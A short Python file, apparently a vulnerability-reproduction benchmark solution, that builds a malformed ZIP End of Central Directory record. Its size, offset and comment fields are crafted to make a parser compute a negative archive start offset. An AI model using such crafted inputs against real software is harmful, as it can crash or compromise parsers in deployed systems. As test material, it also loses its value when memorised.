import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # End of Central Directory (EOCD) with crafted fields to make archive start offset negative
        signature = b'\x50\x4b\x05\x06'      # EOCD signature
        disk_no = b'\x00\x00'                # number of this disk
        start_disk = b'\x00\x00'             # disk with start of central directory
        entries_disk = b'\x01\x00'           # total entries on this disk
        entries_total = b'\x01\x00'          # total entries
        cd_size = b'\x01\x00\x00\x00'        # size of central directory (1)
        cd_offset = b'\x00\x00\x00\x00'      # offset of start of central directory
        comment_len = b'\x18\x00'            # ZIP file comment length (24)
        comment = b'A' * 24                  # comment bytes

        return (
            signature +
            disk_no +
            start_disk +
            entries_disk +
            entries_total +
            cd_size +
            cd_offset +
            comment_len +
            comment
        )